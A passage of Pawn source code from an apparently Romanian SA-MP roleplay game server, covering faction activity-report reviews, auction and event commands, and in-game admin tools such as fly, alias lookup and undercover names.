			format(gString, 128, "%s was uninvited by AdmBot from %s (rank %d) after %d days, with 30 FP. Reason: incomplete faction raport (hours).", PlayerInfo[playerid][pUsername], FactionName(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pDays]);
			PlayerInfo[playerid][pFpunish] = 30;
			UpdateVar(playerid, "FPunish", 30);
		}
		insertFactionLogs(-1, playerid, gString);
		PlayerInfo[playerid][pMember] = 0;
		PlayerInfo[playerid][pRank] = 0;
		UpdateVar(playerid, "Rank", 0);
		UpdateVar(playerid, "Member", 0);
		SpawnPlayer(playerid);
		FactionSpawn[playerid] = 0;
    	UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
		return true;
	}
	if(PlayerInfo[playerid][pFactionInactivity]) {
		format(gString, sizeof(gString), "Your raport was not in considered because you have an active release.");
		SendClientMessage(playerid, COLOR_CLIENT, gString);
		InsertEmail(PlayerInfo[playerid][pSQLID], "AdmBot", gString);

		StopInactivityLession(playerid);
		StartRaportLession(playerid);
		return true;
	}
	if(CheckRaport(playerid, PlayerInfo[playerid][pMember], PlayerInfo[playerid][pRank]) && PlayerInfo[playerid][pConnectMonth] > 3.0) {
		if(PlayerInfo[playerid][pRank] < 5) {
			PlayerInfo[playerid][pRank]++;
			format(gString, 100, "Your raport has been successfully reviewed (completed). Your rank has been changed to %d.", PlayerInfo[playerid][pRank]);
			SendClientMessage(playerid, COLOR_CLIENT, gString);
			UpdateVar(playerid, "Rank", PlayerInfo[playerid][pRank]);
			InsertEmail(PlayerInfo[playerid][pSQLID], "AdmBot", gString);

			format(gString, sizeof gString, "%s completed their activity raport and their rank changed from %d to %d (auto)", PlayerInfo[playerid][pUsername], PlayerInfo[playerid][pRank]-1, PlayerInfo[playerid][pRank]);
			factionLog(PlayerInfo[playerid][pMember], gString);
		}
		StartRaportLession(playerid);
		return true;
	}
	if(PlayerInfo[playerid][pRank] != 1) {
		SendClientMessage(playerid, COLOR_CLIENT, "Your raport has been successfully reviewed (incomplete). You receive a faction warn for incomplete raport.");
		format(gString,sizeof(gString),"Your raport has been successfully reviewed (incomplete). You receive a faction warn for incomplete raport.");
		InsertEmail(PlayerInfo[playerid][pSQLID], "AdmBot", gString);
		PlayerInfo[playerid][pFACWarns] ++;
		UpdateVar(playerid, "FWarn", PlayerInfo[playerid][pFACWarns]);
		PlayerInfo[playerid][pExpFW] = gettime() + (7 * 86400);
		UpdateVar(playerid, "ExpFW", PlayerInfo[playerid][pExpFW]);
		format(gString, sizeof gString, "%s received a faction warn for incomplete raport.",  PlayerInfo[playerid][pUsername]);
		factionLog(PlayerInfo[playerid][pMember], gString);
		StartRaportLession(playerid);
		return true;
	}
	SendClientMessage(playerid, COLOR_CLIENT, "Your raport has been successfully reviewed (incomplete). You have been kicked out of faction because you have rank 1.");
	format(gString,sizeof(gString),"Your raport has been successfully reviewed (incomplete). You have been kicked out of faction because you have rank 1.");
	InsertEmail(PlayerInfo[playerid][pSQLID], "AdmBot", gString);
	Iter_Remove(faction_players<PlayerInfo[playerid][pMember]>, playerid);

	gString[0] = gQuery[0] = EOS;
	format(gString, 128, "%s was uninvited by AdmBot from %s (rank %d) after %d days, with 30 FP. Reason: incomplete faction raport.", PlayerInfo[playerid][pUsername], FactionName(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pDays]);
	insertFactionLogs(-1, playerid, gString);
	PlayerInfo[playerid][pMember] = 0;
	PlayerInfo[playerid][pRank] = 0;
	PlayerInfo[playerid][pFpunish] = 30;
	UpdateVar(playerid, "FPunish", 30);
	UpdateVar(playerid, "Rank", 0);
	UpdateVar(playerid, "Member", 0);
	FactionSpawn[playerid] = 0;
   	UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
	SpawnPlayer(playerid);
	return true;
}

redist::StartInactivityLession(playerid) {
	PlayerInfo[playerid][pFactionInactivity] = gettime() + (86400*7);
	UpdateVar(playerid, "FactionInactivity", PlayerInfo[playerid][pFactionInactivity]);
	return true;
}

redist::StopInactivityLession(playerid) {
	PlayerInfo[playerid][pFactionInactivity] = -1;
	UpdateVar(playerid, "FactionInactivity", PlayerInfo[playerid][pFactionInactivity]);

	free_request_inactivity[playerid] = gettime() + (86400*7);
	UpdateVar(playerid, "free_request_inactivity", free_request_inactivity[playerid]);
	return true;
}

redist::StartRaportLession(playerid) {
	for(new i = 0; i < 3; i++) PlayerInfo[playerid][pCommands][i] = 0;
	PlayerInfo[playerid][pRaportTime] = gettime() + (86400*7);
	UpdateVar(playerid, "RaportExpire", PlayerInfo[playerid][pRaportTime]);
	save_raport(playerid);
	return true;
}

redist::StopReportLession(playerid) {
	for(new i = 0; i < 3; i++) PlayerInfo[playerid][pCommands][i] = 0;
	PlayerInfo[playerid][pRaportTime] = -1;
	UpdateVar(playerid, "RaportExpire", PlayerInfo[playerid][pRaportTime]);
	return save_raport(playerid);
}

stock AddFactionRaport(playerid, const index, value = 1) {
	PlayerInfo[playerid][pCommands][index] += value, save_raport(playerid);
	va_SendClientMessage(playerid, COLOR_YELLOW, "%s: %d", RaportName(PlayerInfo[playerid][pMember], index), PlayerInfo[playerid][pCommands][index]);
	return save_raport(playerid);
}

save_raport(playerid) return _query("UPDATE `users` SET `Raport` = '%i %i %d' WHERE `id` = '%d'", PlayerInfo[playerid][pCommands][0], PlayerInfo[playerid][pCommands][1], PlayerInfo[playerid][pCommands][2], PlayerInfo[playerid][pSQLID]);
stock RaportName(const raportid, const index) {
	gString[0] = EOS;
	switch(raportid) {
		case 1, 2,3,14,19: {
			switch(index) {
				case 0: gString = "Runners";
				case 1: gString = "Tickets";
				case 2: gString = "Confiscated";
			}
		}
		case 4,5,6,10,17,18,25,26,27: {
			switch(index) {
				case 0: gString = "Mats";
				case 1: gString = "Drugs";
			}
		}
		case 12,15,23: {
			switch(index) {
				case 0: gString = "Players shipped (without /calls)";
				case 1: gString = "Players shipped (with /calls)";
			}
		}
		case 13,20: gString = "Players healed";
		case 7,16,21: gString = "Licenses";
		case 8,22: {
			switch(index) {
				case 0: gString = "Trailed vehicles";
				case 1: gString = "Repaired vehicles";
				case 2: gString = "Tanks filled";
			}
		}
		case 11: gString = "Contracts";
		case 9: {
			switch(index) {
				case 0: gString = "Free ad sessions";
				case 1: gString = "News";
				case 2: gString = "Livestreams";
			}
		}
		case 24: gString = "Comenzi efectuate";
	}
	return gString;
}

cmd:fly(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) return true;
	if(IsPlayerInAnyVehicle(playerid)) {
		new Float: x, Float:y, Float:z;
		GetVehicleVelocity(GetPlayerVehicleID(playerid), x, y, z);		
		SetVehicleVelocity(GetPlayerVehicleID(playerid),x, y, z + 0.5);	
		return true;
	}

	if(UsedFly[playerid] == 0) {
		StartFly(playerid);
		UsedFly[playerid] = 1;
		SetPlayerHealthEx(playerid, 100000000);
	}
	else if(UsedFly[playerid] == 1) {
		StopFly(playerid);
		UsedFly[playerid] = 0;
		SetPlayerHealthEx(playerid, 99);
		SendClientMessage(playerid, 0xFFADADFF, "Fly mode off.");
	}
	return true;
}
cmd:alias(playerid, params[]) {	
	if !IsAdmin(playerid, 1) *then
		return true;

	extract params -> new player:userID; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/alias <playerid/name>");

	if !IsPlayerConnected(userID) *then
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(userID) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `IP` = '%s' AND `Status` != '-1' LIMIT 10", GetIPP(userID));
	mysql_tquery(SQL, gQuery, #check_alias_player, #ii, playerid, userID);
	return true;
}

redist::check_alias_player(playerid, const userID) {
	if !cache_num_rows() *then
		return SendClientMessage(playerid, -1, "Acest player nu are mai multe conturi online!");

	new name[MAX_PLAYER_NAME],i=-1,j=cache_num_rows(); gString[0] = EOS;
	while(++i!=j)
		cache_get_value_name(i, "name", name, 24),
		SendClientMessage(playerid, COLOR_LGREEN, name);

	SCMf(playerid, COLOR_LGREEN, "> %s, are %d conturi conectate. <", GetName(userID), j);
	return true;
}

cmd:tpevent(playerid, params[]) {
	if(EventStatus == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu este un event activ!");
	if(JobWorking[playerid] == 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti participa la eveniment deoarece muncesti!");
	if(OnDuty[playerid] == 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti participa la eveniment deoarece esti la datorie!");
	if(PlayerInfo[playerid][pJailTime] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti participa la eveniment deoarece esti in inchisoare!");
	if(PlayerInfo[playerid][pWantedLevel] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti participa la eveniment deoarece esti urmarit de politie!");
	if(PlayerInfo[playerid][pSleeping]) return true;
	if(InWarTurf[PlayerInfo[playerid][pMember]] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Esti la war, nu poti veni participa la eveniment!");
	if(PaintType[playerid] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti participa la eveniment deoarece esti in paintball. (/paintleave)");
	if(Escape[playerid] == 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti merge la event deoarece evadezi!");
	SendClientMessage(playerid, COLOR_YELLOW, "Bine ai venit la event!");
	SetPlayerInterior(playerid, EventInt);
	SetPlayerVirtualWorld(playerid, EventVW);
	SetPlayerPos(playerid, etp[0], etp[1], etp[2]);
	SetPlayerArmourEx(playerid, 0);
	ResetWeapons(playerid);
	return true;
}

cmd:starttp(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);

	if !EventStatus *then {
		extract params -> new string:result[32]; else 
			return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/starttp <text>");

		if FaceReclama(result) *then 
			return RemoveFunction(playerid, result);

		GetPlayerPos(playerid, etp[0], etp[1], etp[2]);
		SCMTA(0xFF8400FF, "Event Time:");
		format(gString, 180,"Admin %s face event %s.", GetName(playerid), result);
		SCMTA(0xFF8400FF, gString);
		SCMTA(0xFF8400FF, "Pentru a participa la event, foloseste /tpevent!");
		EventStatus = true;
		EventInt = GetPlayerInterior(playerid);
		EventVW = GetPlayerVirtualWorld(playerid);
		return true;
	}
	SCMTA(0xFF8400FF, "Inscrierile pentru eveniment au fost incheiate!");
	EventStatus = false;
	return true;
}

cmd:licitatienr(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 5) 
		return true;

	new id[64];
	if(TipLicitatie) 
		return SendClientMessage(playerid, -1, "Este deja o licitatie activa!");

	if(sscanf(params, "s[50]s[64]", params, id)) {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/licitatienr <pp/cash> <numar>");
		return true;
	}
	if(!strcmp(params, "pp", true)) {
		TipLicitatie = 4;
	}
	else if(!strcmp(params, "cash", true)) {
		TipLicitatie = 5;
	}
	else return SendClientMessage(playerid, COLOR_GREY, "Tip invalid!");

	TimpLicitatie = 120;
	format(NumarLicitatie, 60, id);
	bid_money=0;
	LastPlayer = -1;
	
	MesajLicitatie(0xAA71B7FF, "[BID] O noua licitatie tocmai a inceput!");
	switch(TipLicitatie) {
		case 0: return SendClientMessage(playerid, -1, "Nu este o licitatie activa!");
	    case 4: format(gString, 128, "De data aceasta, se liciteaza pentru numarul de inmatriculare %s, cu pp.", id);
	    case 5: format(gString, 128, "De data aceasta, se liciteaza pentru numarul de inmatriculare %s, cu cash (in mana).", id, id);
	}
	MesajLicitatie(0xAA71B7FF, gString);
	MesajLicitatie(0xAA71B7FF, "[INFO] Comenzi utile: (/bid - auction), (/info - informations).");
	return true;
}

cmd:licitatie(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 5) return SendErrorMsg(playerid, AdminOnly);
	if(TipLicitatie) return SendErrorMsg(playerid, "Este deja o licitatie activa!");

	extract params -> new string:type[32], id; else {
		SendUsageMsg(playerid, "licitatie [type] [id]");
		return SendClientMessage(playerid, COLOR_WHITE, "Valabile: Casa, Bizz, Job.");
	}	

	switch(YHash(type, false)) {
		case _I<casa>: {
		    if(id > sizeof HouseInfo) return true;
		    if(!HouseInfo[id][hID]) return SendErrorMsg(playerid, "Invalid ID!");
		    TipLicitatie = 1;
		}
		case _I<bizz>: {
		    if(id > sizeof BizzInfo) return true;
		    if(!BizzInfo[id][bID]) return SendErrorMsg(playerid, "Invalid ID!");
		    TipLicitatie = 2;
		}
		case _I<job>: {
		    if(id > sizeof JobInfo) return true;
		    if(!JobInfo[id][jID]) return SendErrorMsg(playerid, "Invalid ID!");
		    TipLicitatie = 3;
		}
		default: return SendErrorMsg(playerid, "Tip invalid!");
	}

	TimpLicitatie = 120; IDLicitatie = id;
	bid_money = 0; LastPlayer = -1;
	
	MesajLicitatie(0xAA71B7FF, "[BID] O noua licitatie tocmai a inceput!");
	MesajLicitatie(0xAA71B7FF, "[INFO] Comenzi utile: (/bid - auction), (/info - informations).");
    
	gString[0] = EOS;
	switch(TipLicitatie) {
		case 0: return SendClientMessage(playerid, -1, "Nu este o licitatie activa!");
	    case 1: format(gString, 128, "De data aceasta, se liciteaza pentru casa cu ID-ul %d. (/findhouse %d).", id, id);
	    case 2: format(gString, 128, "De data aceasta, se liciteaza pentru afacerea cu ID-ul %d. (/findbiz %d).", id, id);
	    case 3: format(gString, 128, "De data aceasta, se liciteaza pentru jobul %s. (/jobs -> %s).", JobInfo[id][jName], JobInfo[id][jName]);
	}
	MesajLicitatie(0xAA71B7FF, gString);
	return true;
}
cmd:info(playerid, params[]) {
	new id = IDLicitatie;
	switch(TipLicitatie) {
		case 0: return SendClientMessage(playerid, -1, "Nu este o licitatie activa!");
	    case 1: format(gString, 128, "De data aceasta, se liciteaza pentru casa cu ID-ul %d. (/findhouse %d).", id, id);
	    case 2: format(gString, 128, "De data aceasta, se liciteaza pentru afacerea cu ID-ul %d. (/findbiz %d).", id, id);
	    case 3: format(gString, 128, "De data aceasta, se liciteaza pentru jobul %s. (/jobs -> %s).", JobInfo[id][jName], JobInfo[id][jName]);
	    case 4: format(gString, 128, "De data aceasta, se liciteaza pentru numarul de inmatriculare %s. (pp)", NumarLicitatie);
	    case 5: format(gString, 128, "De data aceasta, se liciteaza pentru numarul de inmatriculare %s. (cash)", NumarLicitatie);
	}
	SendClientMessage(playerid, COLOR_YELLOW, gString);
	if(TipLicitatie==0||TipLicitatie==1||TipLicitatie==2||TipLicitatie==3||TipLicitatie==5) {
		if(LastPlayer == -1) return SendClientMessage(playerid, COLOR_YELLOW, "Ultimul care a licitat: Unknown | Suma: $0"); 
		SCMf(playerid, COLOR_YELLOW, "Ultimul care a licitat: %s | Suma: $%s.000.000.", _bid_name, FormatNumber(bid_money));			
	}
	else if(TipLicitatie==4) {
		if(LastPlayer == -1) return SendClientMessage(playerid, COLOR_YELLOW, "Ultimul care a licitat: Unknown | Suma: 0PP"); 
		SCMf(playerid, COLOR_YELLOW, "Ultimul care a licitat: %s | Suma: %sPP.", _bid_name, FormatNumber(bid_money));			
	}
	return true;
}
cmd:auctions(playerid, params[]) {
	SendClientMessage(playerid, COLOR_LGREEN, "> Houses"); gString[0] = EOS;
	for(new i = 1; i < sizeof(HouseInfo); i++) {
		if(strcmp(HouseInfo[i][hOwner],"The State",true) == 0 && HouseInfo[i][hOwned] == 1) {
			format(gQuery, 10, "%d, ", i);
			strcat(gString, gQuery);
		}
	}
	sendSplittedMessageToPlayer(playerid, COLOR_LGREEN, COLOR_LGREEN, gString);
	SendClientMessage(playerid, COLOR_LGREEN, "");
	gString="";
	SendClientMessage(playerid, COLOR_LGREEN, "> Businesses");
	for(new i = 1; i < sizeof(BizzInfo); i++) {
		if(strcmp(BizzInfo[i][bOwner],"The State",true) == 0 && BizzInfo[i][bOwned] == 1) {
			format(gQuery, 10, "%d, ", i);
			strcat(gString, gQuery);
		}
	}
	sendSplittedMessageToPlayer(playerid, COLOR_LGREEN, COLOR_LGREEN, gString);
	SendClientMessage(playerid, COLOR_LGREEN, "");
	gString="";
	SendClientMessage(playerid, COLOR_LGREEN, "> Jobs");
	for(new i = 1; i < sizeof(JobInfo); i++) {
		if(strcmp(JobInfo[i][jOwner],"The State",true) == 0) {
			format(gQuery, 10, "%d, ", i);
			strcat(gString, gQuery);
		}
	}
	sendSplittedMessageToPlayer(playerid, COLOR_LGREEN, COLOR_LGREEN, gString);
	return true; 
}
cmd:bid(playerid, params[]) {
	new id = IDLicitatie;
	switch(TipLicitatie) {
		case 0: return SendClientMessage(playerid, -1, "Nu este o licitatie activa!");
		case 1: if(PlayerInfo[playerid][pLevel] < HouseInfo[id][hLevel]) return SCMf(playerid, COLOR_LGREEN, "Eroare: Nu poti licita pentru o casa daca nu ai level %d+!", HouseInfo[id][hLevel]);
		case 2: if(PlayerInfo[playerid][pLevel] < BizzInfo[id][bLevel]) return SCMf(playerid, COLOR_LGREEN, "Eroare: Nu poti licita pentru o afacere daca nu ai level %d+!", BizzInfo[id][bLevel]);
		case 3: if(PlayerInfo[playerid][pLevel] < 10) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti licita pentru un job daca nu ai level 10+!");
		case 4: if(!Iter_Count(MyVehicle<playerid>)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un vehicul personal!");
		case 5: if(!Iter_Count(MyVehicle<playerid>)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un vehicul personal!");
	}
	new suma;
	if(sscanf(params, "i", suma)) {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/bid <amount>");
		switch(TipLicitatie) {
			case 0: return SendClientMessage(playerid, -1, "Nu este o licitatie activa!");
		    case 1: format(gString, 128, "De data aceasta, se liciteaza pentru casa cu ID-ul %d. (/findhouse %d).", id, id);
		    case 2: format(gString, 128, "De data aceasta, se liciteaza pentru afacerea cu ID-ul %d. (/findbiz %d).", id, id);
		    case 3: format(gString, 128, "De data aceasta, se liciteaza pentru jobul %s. (/jobs -> %s).", JobInfo[id][jName], JobInfo[id][jName]);
		    case 4: format(gString, 128, "De data aceasta, se liciteaza pentru numarul de inmatriculare %s. (pp)", NumarLicitatie);
	    	case 5: format(gString, 128, "De data aceasta, se liciteaza pentru numarul de inmatriculare %s. (cash)", NumarLicitatie);
		}
		SendClientMessage(playerid, COLOR_YELLOW, gString);
		if(TipLicitatie==0||TipLicitatie==1||TipLicitatie==2||TipLicitatie==3||TipLicitatie==5) {
			if(LastPlayer == -1) return SendClientMessage(playerid, COLOR_YELLOW, "Ultimul care a licitat: Unknown | Suma: $0"); 
			SCMf(playerid, COLOR_YELLOW, "Ultimul care a licitat: %s | Suma: $%s.000.000.", _bid_name, FormatNumber(bid_money));			
		}
		else if(TipLicitatie==4) {
			if(LastPlayer == -1) return SendClientMessage(playerid, COLOR_YELLOW, "Ultimul care a licitat: Unknown | Suma: 0PP"); 
			SCMf(playerid, COLOR_YELLOW, "Ultimul care a licitat: %s | Suma: $%sPP.", _bid_name, FormatNumber(bid_money));			
		}
		return true;
	} 
	if(TipLicitatie==0||TipLicitatie==1||TipLicitatie==2||TipLicitatie==3||TipLicitatie==5) {
		format(gString, sizeof gString, "%d000000", suma);
		if OPByte(bank[playerid], <, gString) *then
			return SendClientMessage(playerid, -1, "Nu ai destui bani!");
	
		if(suma<bid_money+1)
			return SCMf(playerid, -1, "Suma invalida! Poti licita minim $%s.000.000.", FormatNumber(bid_money+1));

		listitemmm[playerid] = suma;
		switch(TipLicitatie) {
			case 1: if(PlayerInfo[playerid][pHouse]!=999) { 
				if(!strcmp(HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], PlayerInfo[playerid][pUsername], true))	return SendClientMessage(playerid, COLOR_WHITE, "Ai deja o casa!");
			}
			case 2: if(PlayerInfo[playerid][pBizz]!=255) return SendClientMessage(playerid, -1, "Nu poti licita deoarece ai o afacere.");
			case 3: if(PlayerInfo[playerid][pJobOwner]) return SendClientMessage(playerid, -1, "Nu poti licita deoarece ai un job!");
		}
		format(gString, 128, "Esti sigur ca vrei sa pui $%s.000.000 la licitatie?", FormatNumber(suma));
		ShowPlayerDialog(playerid, DIALOG_BID, DIALOG_STYLE_MSGBOX, "Licitatie", gString, "Yes", "No");
	}//cash
	else if(TipLicitatie==4) {

		if(PlayerInfo[playerid][pPremiumPoints] < suma) 
			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de premium points.");

		if(suma<bid_money+1)
			return SCMf(playerid, -1, "Suma invalida! Poti licita minim %sPP.", FormatNumber(bid_money+1));

		listitemmm[playerid] = suma;
		format(gString, 128, "Esti sigur ca vrei sa pui %sPP la licitatie?", FormatNumber(suma));
		ShowPlayerDialog(playerid, DIALOG_BID, DIALOG_STYLE_MSGBOX, "Licitatie", gString, "Yes", "No");
	}//pp
	return true;
}


stock MesajLicitatie(color, const string[]) {
	foreach(new i : logged_players) if toglicitatie[i] *then SendClientMessage(i, color, string);
	return true;
}
cmd:acover(playerid, params[]) {
	if !IsAdmin(playerid, 5) *then
		return true;

	extract params -> new string:name[24]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/acover <name>");

	Iter_Add(Acovers, playerid);
	PlayerInfo[playerid][pChatCMD] = 14;
	SetPlayerColor(playerid, -1);
	SetPlayerScore(playerid, 1+random(2));
	SetPlayerSkin(playerid, 1+random(100));
	SetPlayerName(playerid, name);
	_query("UPDATE `users` SET `acover` = '%s' WHERE `id` = '%i'", name, PlayerInfo[playerid][pSQLID]);
    SendClientMessage(playerid, -1, "Esti sub acoperire!");
	return true;
}
cmd:acoveroff(playerid) {
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	if(!Iter_Contains(Acovers, playerid)) return SendClientMessage(playerid, -1, "Nu esti sub acoperire!");
	Iter_Remove(Acovers, playerid);
	PlayerInfo[playerid][pChatCMD] = 0;
	new clanid = PlayerInfo[playerid][pClan];
	new string[180];
	SendClientMessage(playerid, -1, "Nu mai esti sub acoperire!");
	if(PlayerInfo[playerid][pClan] != 0 && PlayerInfo[playerid][pTag] == -1) {
		format(string, sizeof(string), "%s", PlayerInfo[playerid][pUsername]);
	    SetPlayerName(playerid, string);
	}
	else if(PlayerInfo[playerid][pClan] != 0 && PlayerInfo[playerid][pTag] == 0) {
	    format(string, sizeof(string), "%s%s", ClanInfo[clanid][clTag], PlayerInfo[playerid][pUsername]);
	    SetPlayerName(playerid, string);
	}
	else if(PlayerInfo[playerid][pClan] != 0 && PlayerInfo[playerid][pTag] == 1) {
	    format(string, sizeof(string), "%s%s", PlayerInfo[playerid][pUsername], ClanInfo[clanid][clTag]);
	    SetPlayerName(playerid, string);
	}
	else SetPlayerName(playerid, PlayerInfo[playerid][pUsername]);
    SetPlayerToTeamColor(playerid);
    SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	return true;
}

cmd:colors(playerid, params[]) {
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Vehicle Colors List", "{FFFFFF}Culori normale:\n \
		{000000}000 {F5F5F5}001 {2A77A1}002 {840410}003 {263739}004 {86446E}005 {D78E10}006 {4C75B7}007 {BDBEC6}008 {5E7072}009 \
		{46597A}010 {656A79}011 {5D7E8D}012 {58595A}013 {D6DAD6}014 {9CA1A3}015 {335F3F}016 {730E1A}017 {7B0A2A}018 {9F9D94}019 \
		\n{3B4E78}020 {732E3E}021 {691E3B}022 {96918C}023 {515459}024 {3F3E45}025 {A5A9A7}026 {635C5A}027 {3D4A68}028 {979592}029 \
		{421F21}030 {5F272B}031 {8494AB}032 {767B7C}033 {646464}034 {5A5752}035 {252527}036 {2D3A35}037 {93A396}038 {6D7A88}039 \
		\n{221918}040 {6F675F}041 {7C1C2A}042 {5F0A15}043 {193826}044 {5D1B20}045 {9D9872}046 {7A7560}047 {989586}048 {ADB0B0}049 \
		{848988}050 {304F45}051 {4D6268}052 {162248}053 {272F4B}054 {7D6256}055 {9EA4AB}056 {9C8D71}057 {6D1822}058 {4E6881}059 \
		\n{9C9C98}060 {917347}061 {661C26}062 {949D9F}063 {A4A7A5}064 {8E8C46}065 {341A1E}066 {6A7A8C}067 {AAAD8E}068 {AB988F}069 \
		{851F2E}070 {6F8297}071 {585853}072 {9AA790}073 {601A23}074 {20202C}075 {A4A096}076 {AA9D84}077 {78222B}078 {0E316D}079 \
		\n{722A3F}080 {7B715E}081 {741D28}082 {1E2E32}083 {4D322F}084 {7C1B44}085 {2E5B20}086 {395A83}087 {6D2837}088 {A7A28F}089 \
		{AFB1B1}090 {364155}091 {6D6C6E}092 {0F6A89}093 {204B6B}094 {2B3E57}095 {9B9F9D}096 {6C8495}097 {4D8495}098 {AE9B7F}099 \
		\n{406C8F}100 {1F253B}101 {AB9276}102 {134573}103 {96816C}104 {64686A}105 {105082}106 {A19983}107 {385694}108 {525661}109 \
		{7F6956}110 {8C929A}111 {596E87}112 {473532}113 {44624F}114 {730A27}115 {223457}116 {640D1B}117 {A3ADC6}118 {695853}119 \
		\n{9B8B80}120 {620B1C}121 {5B5D5E}122 {624428}123 {731827}124 {1B376D}125 {EC6AAE}126 {000000}127 \
		\n\n{FFFFFF}Culori hidden:\n \
		{177517}128 {210606}129 {125478}130 {452A0D}131 {571E1E}132 {010701}133 {25225A}134 {2C89AA}135 {8A4DBD}136 {35963A}137 \
		{B7B7B7}138 {464C8D}139 {84888C}140 {817867}141 {817A26}142 {6A506F}143 {583E6F}144 {8CB972}145 {824F78}146 {6D276A}147 \
		\n{1E1D13}148 {1E1306}149 {1F2518}150 {2C4531}151 {1E4C99}152 {2E5F43}153 {1E9948}154 {1E9999}155 {999976}156 {7C8499}157 \
		{992E1E}158 {2C1E08}159 {142407}160 {993E4D}161 {1E4C99}162 {198181}163 {1A292A}164 {16616F}165 {1B6687}166 {6C3F99}167 \
		\n{481A0E}168 {7A7399}169 {746D99}170 {53387E}171 {222407}172 {3E190C}173 {46210E}174 {991E1E}175 {8D4C8D}176 {805B80}177 \
		{7B3E7E}178 {3C1737}179 {733517}180 {781818}181 {83341A}182 {8E2F1C}183 {7E3E53}184 {7C6D7C}185 {020C02}186 {072407}187 \
		\n{163012}188 {16301B}189 {642B4F}190 {368452}191 {999590}192 {818D96}193 {99991E}194 {7F994C}195 {839292}196 {788222}197 \
		{2B3C99}198 {3A3A0B}199 {8A794E}200 {0E1F49}201 {15371C}202 {15273A}203 {375775}204 {060820}205 {071326}206 {20394B}207 \
		\n{2C5089}208 {15426C}209 {103250}210 {241663}211 {692015}212 {8C8D94}213 {516013}214 {090F02}215 {8C573A}216 {52888E}217 \
		{995C52}218 {99581E}219 {993A63}220 {998F4E}221 {99311E}222 {0D1842}223 {521E1E}224 {42420D}225 {4C991E}226 {082A1D}227 \
		\n{96821D}228 {197F19}229 {3B141F}230 {745217}231 {893F8D}232 {7E1A6C}233 {0B370B}234 {27450D}235 {071F24}236 {784573}237 \
		{8A653A}238 {732617}239 {319490}240 {56941D}241 {59163D}242 {1B8A2F}243 {38160B}244 {041804}245 {355D8E}246 {2E3F5B}247 \
		\n{561A28}248 {4E0E27}249 {706C67}250 {3B3E42}251 {2E2D33}252 {7B7E7D}253 {4A4442}254 {28344E}255", "Exit","");
	return true;
}
cmd:killcp(playerid, params[]) {
	#pragma unused params
	if(!CP[playerid]) return SendErrorMsg(playerid, "Nu ai un checkpoint.");
	return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
}

cmd:rb(playerid, params[]) {
	if DeelayCommand[playerid][8]>gettime() *then 
		return DeelayTime(playerid, 8);

	if PlayerInfo[playerid][pReborn]==0 && PlayerInfo[playerid][pAdmin] == 0 *then
		return true;
	
	if togReborn[playerid] *then
		return true;
	
	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	
	extract params -> new string:text[80]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/rb <text>");
	
	if FaceReclama(text) *then
		return Reclama(playerid, text);
	
	new rbstring[128];
	format(rbstring, sizeof(rbstring), "Reborn %d {D4AF37}", PlayerInfo[playerid][pReborn]);

	format(gString, 128, "%s%s{4879c2}: %s", Iter_Contains(Staff<ADMIN>, playerid) ? ("Admin {ff0000}") : PlayerInfo[playerid][pReborn] == 1 ? ("Reborn 1 ") : (rbstring), GetName(playerid), text);
	DeelayCommand[playerid][8] = gettime()+5;
	foreach(new i : Staff<ADMIN>) if(!togReborn[i]) return sendSplittedMessageToPlayer(i, 0x4879c2FF, 0x4879c2FF, gString);
	foreach(new i : PlayerVips<LEGEND>) {
		if(Iter_Contains(Staff<ADMIN>, i)) continue;
		if(!togReborn[i]) return sendSplittedMessageToPlayer(i, 0x4879c2FF, 0x4879c2FF, gString);
	}
	return true;
}

cmd:vc(playerid, params[]) {
	if(DeelayCommand[playerid][8] > gettime()) return DeelayTime(playerid, 8);
	if(!PlayerInfo[playerid][pVip] && !PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);
	if(togvip[playerid]) return SendErrorMsg(playerid, "Chatul (/vc) este oprit din (/tog)!");
